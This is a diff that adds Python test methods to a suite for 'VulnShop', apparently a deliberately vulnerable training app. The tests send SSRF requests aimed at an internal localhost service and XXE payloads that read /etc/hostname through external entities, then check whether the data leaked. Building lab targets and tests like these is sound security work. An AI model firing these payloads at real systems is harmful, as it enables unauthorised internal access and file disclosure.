@@ -458,6 +458,190 @@ class VulnShopTester:
             self.log_result("error", "Reflected XSS - Search Render", False, f"Error: {str(e)}")
             return False
 
+    def test_vulnerabilities_documentation(self):
+        """Test vulnerabilities documentation endpoint"""
+        try:
+            response = self.session.get(f"{self.api_url}/vulnerabilities")
+            success = response.status_code == 200
+            
+            if success:
+                data = response.json()
+                vulns = data.get("vulnerabilities", [])
+                total_count = data.get("total_count", 0)
+                categories = data.get("categories", {})
+                
+                if total_count == 16 and len(vulns) == 16:
+                    details = f"Documentation complete - {total_count} vulnerabilities, {len(categories)} categories"
+                else:
+                    details = f"Documentation incomplete - Expected 16, got {len(vulns)} vulnerabilities"
+                    success = False
+            else:
+                details = f"Status: {response.status_code}"
+            
+            self.log_result("docs", "Vulnerabilities Documentation", success, details)
+            return success
+        except Exception as e:
+            self.log_result("error", "Vulnerabilities Documentation", False, f"Error: {str(e)}")
+            return False
+
+    def test_ssrf_webhook(self):
+        """Test SSRF vulnerability in webhook test endpoint"""
+        try:
+            # SSRF payload to access internal service
+            payload = {
+                "url": "http://localhost:8001/api/"
+            }
+            
+            response = self.session.post(f"{self.api_url}/webhook/test", json=payload)
+            success = response.status_code == 200
+            
+            if success:
+                data = response.json()
+                if "content" in data and data.get("status_code") == 200:
+                    details = f"SSRF successful - Accessed internal service, got {data.get('content_length', 0)} bytes"
+                    vulnerability = True
+                elif "error" in data:
+                    details = f"SSRF attempt failed: {data['error']}"
+                    vulnerability = False
+                else:
+                    details = f"SSRF response unclear: {data}"
+                    vulnerability = False
+            else:
+                details = f"Status: {response.status_code}"
+                vulnerability = False
+            
+            self.log_result("vuln", "SSRF - Webhook Test", success, details, vulnerability)
+            return success
+        except Exception as e:
+            self.log_result("error", "SSRF - Webhook Test", False, f"Error: {str(e)}")
+            return False
+
+    def test_ssrf_image_fetch(self):
+        """Test SSRF vulnerability in image fetch endpoint"""
+        try:
+            # SSRF payload to access internal service
+            internal_url = "http://localhost:8001/api/"
+            
+            response = self.session.get(f"{self.api_url}/fetch-image?url={quote(internal_url)}")
+            success = response.status_code == 200
+            
+            if success:
+                data = response.json()
+                if data.get("status") == 200:
+                    details = f"SSRF successful - Fetched internal URL, size: {data.get('size', 0)} bytes"
+                    vulnerability = True
+                elif "error" in data:
+                    details = f"SSRF attempt failed: {data['error']}"
+                    vulnerability = False
+                else:
+                    details = f"SSRF response unclear: {data}"
+                    vulnerability = False
+            else:
+                details = f"Status: {response.status_code}"
+                vulnerability = False
+            
+            self.log_result("vuln", "SSRF - Image Fetch", success, details, vulnerability)
+            return success
+        except Exception as e:
+            self.log_result("error", "SSRF - Image Fetch", False, f"Error: {str(e)}")
+            return False
+
+    def test_xxe_product_import(self):
+        """Test XXE vulnerability in product import endpoint"""
+        try:
+            # XXE payload to read local file
+            xxe_payload = '''<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<products>
+  <product>
+    <name>&xxe;</name>
+    <price>100</price>
+    <description>Test product</description>
+    <category>Test</category>
+  </product>
+</products>'''
+            
+            payload = {
+                "xml_data": xxe_payload
+            }
+            
+            response = self.session.post(f"{self.api_url}/import/products", json=payload)
+            success = response.status_code == 200
+            
+            if success:
+                data = response.json()
+                if data.get("success"):
+                    products = data.get("parsed_products", [])
+                    if products and len(products[0].get("name", "")) > 0:
+                        name_content = products[0]["name"]
+                        if name_content != "&xxe;" and len(name_content.strip()) > 0:
+                            details = f"XXE successful - File content leaked: {name_content[:50]}..."
+                            vulnerability = True
+                        else:
+                            details = "XXE attempt - Entity not resolved"
+                            vulnerability = False
+                    else:
+                        details = "XXE attempt - No product data parsed"
+                        vulnerability = False
+                else:
+                    details = f"XXE failed: {data.get('error', 'Unknown error')}"
+                    vulnerability = False
+            else:
+                details = f"Status: {response.status_code}"
+                vulnerability = False
+            
+            self.log_result("vuln", "XXE - Product Import", success, details, vulnerability)
+            return success
+        except Exception as e:
+            self.log_result("error", "XXE - Product Import", False, f"Error: {str(e)}")
+            return False
+
+    def test_xxe_config_import(self):
+        """Test XXE vulnerability in config import endpoint"""
+        try:
+            # XXE payload to read local file
+            xxe_payload = '''<?xml version="1.0"?>
+<!DOCTYPE config [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<config>
+  <setting>&xxe;</setting>
+  <debug>true</debug>
+</config>'''
+            
+            response = self.session.post(
+                f"{self.api_url}/config/import", 
+                data=xxe_payload,
+                headers={"Content-Type": "application/xml"}
+            )
+            success = response.status_code == 200
+            
+            if success:
+                data = response.json()
+                if data.get("success"):
+                    config = data.get("config", {})
+                    setting_value = config.get("setting", "")
+                    if setting_value != "&xxe;" and len(setting_value.strip()) > 0:
+                        details = f"XXE successful - File content leaked: {setting_value[:50]}..."
+                        vulnerability = True
+                    else:
+                        details = "XXE attempt - Entity not resolved"
+                        vulnerability = False
+                else:
+                    details = f"XXE failed: {data.get('error', 'Unknown error')}"
+                    vulnerability = False
+            else:
+                details = f"Status: {response.status_code}"
+                vulnerability = False
+            
+            self.log_result("vuln", "XXE - Config Import", success, details, vulnerability)
+            return success
+        except Exception as e:
+            self.log_result("error", "XXE - Config Import", False, f"Error: {str(e)}")
+            return False
+
     def run_all_tests(self):
         """Run all tests"""
         print("🚀 Starting VulnShop Backend Testing Suite")
